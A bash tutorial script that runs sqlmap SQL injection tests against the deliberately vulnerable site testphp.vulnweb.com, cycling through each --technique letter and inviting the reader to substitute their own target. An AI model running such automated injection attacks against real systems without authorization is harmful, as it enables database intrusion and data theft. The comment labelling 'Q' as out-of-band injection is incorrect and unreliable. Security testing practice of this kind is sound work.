#!/bin/bash
# SQLmap Automated Testing Script with --technique Option
# Author: Priyanshu K Sharma
# Date: 15th Jan 2025
# Description: Executes SQLmap commands with the --technique option for selective testing.
# The --technique option in SQLmap allows you to specify which injection techniques SQLmap should use during testing. 
# By default, SQLmap automatically tries all techniques, but you can limit or prioritize certain types of injection techniques by specifying one or more of the following techniques:

# Techniques Available in SQLmap:
# B: Boolean-based Blind SQL injection.
# E: Error-based SQL injection.
# T: Time-based Blind SQL injection.
# U: UNION query SQL injection.
# S: Stacked queries SQL injection.
# Q: OUT-of-Band (OOB) SQL injection.
# You can combine multiple techniques by specifying them as a string, e.g., --technique=BE.

# Check if SQLmap is installed
if ! command -v sqlmap &> /dev/null; then
    echo "SQLmap is not installed. Please install it and try again."
    exit 1
fi

# Target URL
TARGET_URL="http://testphp.vulnweb.com/index.php" # Replace with your target URL

# Example 1: Test Boolean-Based Blind Injection
echo "Testing Boolean-Based Blind Injection..."
sqlmap -u "$TARGET_URL?id=1" --technique=B --batch

# Example 2: Test Error-Based Injection
echo "Testing Error-Based Injection..."
sqlmap -u "$TARGET_URL?id=1" --technique=E --batch

# Example 3: Test Time-Based Blind Injection
echo "Testing Time-Based Blind Injection..."
sqlmap -u "$TARGET_URL?id=1" --technique=T --batch

# Example 4: Test UNION Query Injection
echo "Testing UNION Query Injection..."
sqlmap -u "$TARGET_URL?id=1" --technique=U --batch

# Example 5: Test Stacked Queries Injection
echo "Testing Stacked Queries Injection..."
sqlmap -u "$TARGET_URL?id=1" --technique=S --batch

# Example 6: Test Out-of-Band Injection
echo "Testing Out-of-Band Injection..."
sqlmap -u "$TARGET_URL?id=1" --technique=Q --batch

# Example 7: Combine Multiple Techniques (e.g., B, E, and U)
echo "Testing Boolean, Error, and UNION Injection..."
sqlmap -u "$TARGET_URL?id=1" --technique=BEU --batch

# Script Completed
echo "All tests completed."
